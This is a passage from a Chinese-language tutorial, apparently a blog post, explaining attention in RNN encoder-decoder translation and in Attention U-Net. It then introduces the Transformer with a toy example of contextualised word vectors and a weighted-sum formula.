<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e419faab7944e6b349a951d186a46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=SCu4PwUiI6NFRhIUSmQ2rbpnVcA%3D" alt="c4.jpg" width="100%" loading="lazy"/></p>
<p>此时，编码器不再输出一个代表整个句子的单一隐藏状态，而是让输入序列中的每个词经过双向 RNN 后，都对应一个独立的语义向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。例如，“How” 对应<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">O_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ，“are” 对应<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">O_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，依此类推。解码时，我们不再将整个句子信息一股脑儿注入，而是<strong>动态计算一个上下文向量</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">c_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，它由所有<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>加权求和得到：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>j</mi></munder><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">c_{t} = \sum_{j}q_{(t,j)}O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4638em;vertical-align:-1.4138em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>这里面的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span>就是比例系数，也可以说是注意力分数，它表示在解码第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>个词时，编码器第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>个输出的重要程度。它是如何得到的呢？通常通过当前解码器的隐藏状态<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>与每一个编码器输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>进行匹配计算得到，计算方式如上图右边所示，就是将<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>与<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>输入到一个可以训练的简单全链接神经网络中去，计算得到匹配分数<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>，然后对所有<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>进行softmax归一化，就可以得到权重<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p>这样一来，模型就能动态地为不同编码器输出分配合适的“注意力”。比如翻译“你”时，它可能给“you”较高的权重，而忽略“How”和"are"。<strong>这个机制本质上是一种可学习的“信息筛选器”</strong>，让解码过程既保持上下文感知，又避免无关噪声的干扰。</p>
<p>再举一个计算机视觉领域的经典例子——<strong>U-Net</strong>。它在图像分割领域几乎家喻户晓，其架构的核心特征是对称的编码器-解码器结构以及贯穿始终的<strong>跳跃连接</strong>（Skip Connections），网络架构图如下所示：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d406d65c79e94bb2ac9d79d1c442e3a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=KH6graVHYK1VQjptSqLzVqt2vng%3D" alt="c5.png" width="100%" loading="lazy"/></p>
<p align="center">「图片来源：《U-Net: Convolutional Networks for Biomedical Image Segmentation》」</p>
<p>图中灰色的箭头就是跳跃连接，这些跳跃连接将编码器浅层捕获的、富含细节和空间信息的特征图，直接传递到解码器的对应层，与经过深层抽象的特征进行融合。</p>
<p>其实观察一下，我们不难发现，**真的有必要将早期特征毫无保留地全部传递过去吗？**早期的特征固然包含精确定位所需的细节，但也混杂了大量与分割主题无关的纹理、噪声或背景干扰。全部融合，固然保证了信息的“不丢失”，却也引入了“不纯粹”。</p>
<p>这就催生了 <strong>Attention U-Net</strong> 网络架构。它的解决方案直观而巧妙：在跳跃连接上增设一个<strong>注意力门控</strong>。这个门控机制会自动学习，为传递过来的每一个空间位置的特征计算一个0到1之间的权重。重要的、与当前分割目标相关的特征得以强调（权重接近1），而不相关或冗余的背景信息则被抑制（权重接近0）。这个过程，与前述RNN中的注意力在精神上高度同源，都是<strong>对信息流的主动筛选与加权</strong>。</p>
<p>如果上面的内容你一时没有完全理解，也不用担心——这部分其实已经涉及到 RNN 时期自然语言处理的核心建模思路。了解它们对理解 Transformer 有帮助，但并不是必须的。我主要就是想表达“注意力”这个机制在很久以前就存在了，<strong>“注意力”远非Transformer的专属</strong>，只不过Transformer它彻底抛弃了循环与卷积的固有结构，<strong>将“注意力”推至舞台中央，作为构建模型最核心、甚至是唯一的算子</strong>，并以此为基础，设计了一套简洁、对称且空前强大的架构。接下来，我们就正式进入<strong>Transformer</strong>的世界，看看它是如何彻底抛弃循环结构，完全基于注意力来重构序列建模的。</p>
<hr/>
<p>首先，我们需要明确 Transformer 究竟做了什么。简单来说，它的核心机制是<strong>将一个序列转换为另一个序列</strong>，同时让序列中的每个元素都能“注意到”序列中的其他元素。</p>
<p>让我们来看一个具体的例子。假设我们有三个词的向量表示（词嵌入）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 原始的三个向量</span>
X =  [[<span class="hljs-number">0.431</span>, <span class="hljs-number">0.313</span>, ..., <span class="hljs-number">0.507</span>],   <span class="hljs-comment"># I 的词向量，记作 x₁</span>
     [<span class="hljs-number">0.396</span>, <span class="hljs-number">0.836</span>, ..., <span class="hljs-number">0.105</span>],   <span class="hljs-comment"># love 的词向量，记作 x₂</span>
     [<span class="hljs-number">0.852</span>, <span class="hljs-number">0.381</span>, ..., <span class="hljs-number">0.541</span>]]   <span class="hljs-comment"># apple 的词向量，记作 x₃</span>

<span class="hljs-comment"># ==== 经过一个 Transformer 层后得到：====</span>

<span class="hljs-comment"># 输出仍然是三个向量，但已融入了上下文信息</span>
Y =  [[<span class="hljs-number">0.624</span>, <span class="hljs-number">0.362</span>, ..., <span class="hljs-number">0.802</span>],   <span class="hljs-comment"># 记作 y₁</span>
     [<span class="hljs-number">0.572</span>, <span class="hljs-number">0.260</span>, ..., <span class="hljs-number">0.249</span>],   <span class="hljs-comment"># 记作 y₂</span>
     [<span class="hljs-number">0.158</span>, <span class="hljs-number">0.458</span>, ..., <span class="hljs-number">0.066</span>]]   <span class="hljs-comment"># 记作 y₃</span>
</code></pre>
<p>经过Transformer层输出的这三个向量都不再仅仅是自身原本的含义，而是<strong>携带了其他词语信息的“语境化”表示</strong>。那么它是如何捕捉其他词语的注意力信息的呢？如果让你来设计，你会如何实现这种“注意力”？</p>
<p>如果让我来设计，要让 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 包含 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的信息，最直接的方式就是对它们进行加权求和：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}=q_{1}x_{1} + q_{2}x_{2} + q_{3}x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
